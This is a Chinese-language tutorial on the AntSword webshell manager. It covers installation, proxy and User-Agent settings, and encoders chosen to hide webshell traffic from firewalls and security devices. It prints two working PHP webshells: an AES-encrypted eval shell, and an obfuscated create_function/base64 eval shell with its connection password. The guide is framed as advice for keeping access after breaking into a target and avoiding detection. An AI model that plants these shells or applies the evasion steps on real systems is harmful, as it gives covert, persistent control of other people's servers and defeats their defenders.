# antsword

## 前言

蚁剑（antsword）是一款优秀的webshell管理工具，使用该工具的时候可能是很多人最幸福的时刻之一，因为使用该工具代表着我们经过千辛万苦获取到了一定的权限，但如果我们使用不当，这很可能是我们最悲伤的时候

很多人对于webshell管理工具的使用可能很粗糙，比如上传了一句话木马后，就直接使工具连接了。但现在的安全设备已经十分熟悉蚁剑这一类工具的指纹信息了，可能我们刚连上木马，下一秒权限就丢失了

官方文档：https://www.yuque.com/antswordproject/antsword
项目地址：https://github.com/AntSwordProject/AntSword


# 安装

## Windows 安装

1、创建一个空目录，确保绝对路径中不包含中文

2、下载蚁剑源码到此目录中：

```
源码下载：https://github.com/AntSwordProject/antSword/archive/refs/heads/master.zip
```

3、下载对应系统版本的加载器，并解压：
```
加载器：https://github.com/AntSwordProject/AntSword-Loader
```

4、使用管理员权限执行antSword.exe

5、点击初始化，并在选择工作目录时，选择存放蚁剑源码的目录。

## Linux 安装

1、创建一个空目录，确保绝对路径中不包含中文。
```
mkdir antSword
```
2、下载蚁剑源码到此目录中：
```bash
cd antSword
git clone https://github.com/AntSwordProject/antSword.git
chmod 644 antSword/antSword-master
```
3、下载对应系统版本的加载器：
```bash
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/v4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
```
4、进入加载器目录，赋予可执行权限：
```bash
unzip AntSword-Loader-v4.0.3-linux-x64.zip
mv AntSword-Loader-v4.0.3-linux-x64 /usr/local/antsword
chmod u+x /usr/local/antsword/AntSword
ln -s /usr/local/antsword/AntSword /usr/local/bin/antsword
```
5、启动蚁剑：
```bash
sudo antsword
```
6、点击初始化，并在选择工作目录时，选择存放蚁剑源码的目录。

## 初始化

在图形化界面的命令行中执行：
```
chmod 777 /usr/local/antsword
antsword
```
- 在弹出的窗口中点击：`Initialize`
- 在弹出的窗口中选择：`/usr/local/antsword`，点击右下角`OK`
- 等待下载完成后，窗口自动关闭就是安装好了
- 启动命令：`antsword`
## 设置代理

使用代理主要目的是隐藏自身，注意使用代理可以连接内网shell的技巧不要忘了。另外可以设置代理地址为burp，自己抓包看看 antsword 的流量

![image.png](https://minioapi.nerubian.cn/image/20250331191232554.jpeg)

## 请求头配置

antsword 最明显的流量特征就是 User-Agent，不过我下载的最新版竟然会自动生成 User-Agent。为了安全还是设置一下

![image.png](https://minioapi.nerubian.cn/image/20250331191232661.jpeg)

设置好后可以用 burp 抓包验证一下

![image.png](https://minioapi.nerubian.cn/image/20250331191232809.jpeg)

## 编码器

User-Agent 设置好后，但我们却发现注入的代码基本是明文传输，如果目标有防火墙之类的设备，我们会很难连接上shell

antsword 提供了几种编码器也可以尝试使用，如 chr 编码器，PHP 类型独有，通信时使用 `chr`函数对传输的字符串进行处理拼接，可以看到请求中除了 eval 字样没有明显的特征信息

![image.png](https://minioapi.nerubian.cn/image/20250331191232751.jpeg)

hex 编码器，ASPX, CUSTOM 类独有，将通信数据字符转成16进制数据传输

另外我找到 antsword 在 github 上也提供了一些编码器：https://github.com/AntSwordProject/AwesomeEncoder

我这里以 aes_128_ecb_zero_padding.js为例，演示一下怎么去设置使用这些编码器

复制代码先手动添加编码器和解码器

![image.png](https://minioapi.nerubian.cn/image/20250331191232880.jpeg)

该编码器是需要特定的shell配合的，所以我们上传的shell需要单独定制，如该编码器需要的shell如下：

```php
<?php
@session_start();
$pwd='ant';
$key=@substr(str_pad(session_id(),16,'a'),0,16);
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
?>
```

链接shell时要选好对应的编码器和解码器

![image.png](https://minioapi.nerubian.cn/image/20250331191232645.jpeg)

可以抓包看下流量，基本上没有什么特征信息了

![image.png](https://minioapi.nerubian.cn/image/20250331191233814.jpeg)

如果能做到webshell免杀和通信流量隐藏，我们就会拥有稳稳的幸福

# 连接

```php
<?php // 使用时请删除此行, 连接密码: PBhrkcDW ?>
<?php $GpYh=create_function(str_rot13('$').chr(591-476).chr(98901/891).str_rot13('z').chr(792-691),base64_decode('ZQ==').chr(900-782).base64_decode('YQ==').str_rot13('y').chr(35760/894).chr(23436/651).chr(0xdf-0x6c).str_rot13('b').base64_decode('bQ==').base64_decode('ZQ==').base64_decode('KQ==').str_rot13(';'));$GpYh(base64_decode('MzI2M'.'zE0O0'.'BldkF'.'sKCRf'.''.chr(0x63f1/0x12d).chr(0x6627/0x17b).str_rot13('9').chr(0x10d10/0x334).str_rot13('I').''.''.chr(66570/951).chr(76212/657).str_rot13('D').chr(714-633).chr(0314632/01702).''.'hya2N'.'EV10p'.'Ozk3O'.'Dk0Mj'.'s='.''));?>
```